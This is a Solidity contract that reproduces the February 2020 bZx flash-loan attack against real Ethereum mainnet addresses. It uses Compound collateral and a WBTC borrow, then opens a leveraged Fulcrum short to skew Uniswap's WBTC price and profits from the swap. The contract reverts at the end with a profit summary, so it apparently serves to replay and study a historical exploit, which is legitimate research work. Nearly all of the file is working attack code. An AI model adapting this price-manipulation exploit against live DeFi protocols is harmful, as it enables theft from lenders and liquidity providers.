// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// Block 9484688
// Block index 28
// Timestamp  Sat, 15 Feb 2020 01:38:57 +0000
// Gas price  10 gwei
// Gas limit  5000000
// Exploit Contract: 0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838





contract bZx_first_attack {
    address private dydxAddress = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address private WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private WBTCAddress = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private cEthAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private cWBTCAddress = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address private ComptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address private UniswapWBTCAddress = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;

    address private FulcrumsETHwBTC5xAddress = 0xb0200B0677dD825bb32B93d055eBb9dc3521db9D;
    address private KyberAddress = 0x818E6FECD516Ecc3849DAf6845e3EC868087B755;
    address private EOA;

    FulcrumShort private FulcrumsETHwBTC = FulcrumShort(FulcrumsETHwBTC5xAddress);
    IWETH private WETH = IWETH(WETHAddress);
    IWBTC private WBTC = IWBTC(WBTCAddress);
    ICEther private cETH = ICEther(payable(cEthAddress));
    IcWBTC private cWBTC = IcWBTC(cWBTCAddress);
    UniswapExchangeInterface private exchange = UniswapExchangeInterface(UniswapWBTCAddress);
    SimpleNetworkInterface private Kyber = SimpleNetworkInterface(KyberAddress);


    uint256 balance1 = 0;
    uint256 balance2 = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    uint256 mintAmountETH = 0;
    uint256 borrowAmountBTC = 0;

    constructor() payable {
        require(msg.value == 10000 ether, "loan amount does not match");
        EOA = msg.sender;
        WBTC.approve(UniswapWBTCAddress, 2**256 - 1);
        WBTC.approve(cWBTCAddress, 2**256 - 1);

        address[] memory markets = new address[](2);
        markets[0] = cEthAddress;
        markets[1] = cWBTCAddress;
        ComptrollerInterface comptroller = ComptrollerInterface(ComptrollerAddress);
        comptroller.enterMarkets(markets);
    }

    receive() external payable {}


    // flashloan amount: 4500 ETH and 112 WBTC
    function attack() public {

        mintAmountETH = 5500 ether;
        cETH.mint{value: mintAmountETH}();

        borrowAmountBTC = 112*10**8;
        cWBTC.borrow(borrowAmountBTC);
        // --------------------------------------------------------------------

        // action 1: ETH -> None  State: Uniswap
        //    State: Uniswap
        FulcrumsETHwBTC.mintWithEther{value: 1300 ether}(address(this), 0);  // Maximum run once

        balance1 = WBTC.balanceOf(UniswapWBTCAddress);
        balance2 = UniswapWBTCAddress.balance;

        // action 2: WBTC -> ETH  State: Uniswap
        //    State: Uniswap
        exchange.tokenToEthSwapInput(112*10**8, 1, 0xffffffff);

        revert(ProfitSummary());
        // Adjusted Profit: 2209 412738870224322944
    }


    function ProfitSummary() internal returns (string memory _uintAsString){
        balance1 = address(this).balance - 4500 * 10 ** 18;  // ETH earned
        balance2 = 150 * 10 ** 8 - WBTC.balanceOf(address(this)); // WBTC spent
        str1 = append("Adjusted Profit: ", uint2str(balance1 - balance2 * 10 ** 10 * 3908 / 100 ));
        return str1;
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }


}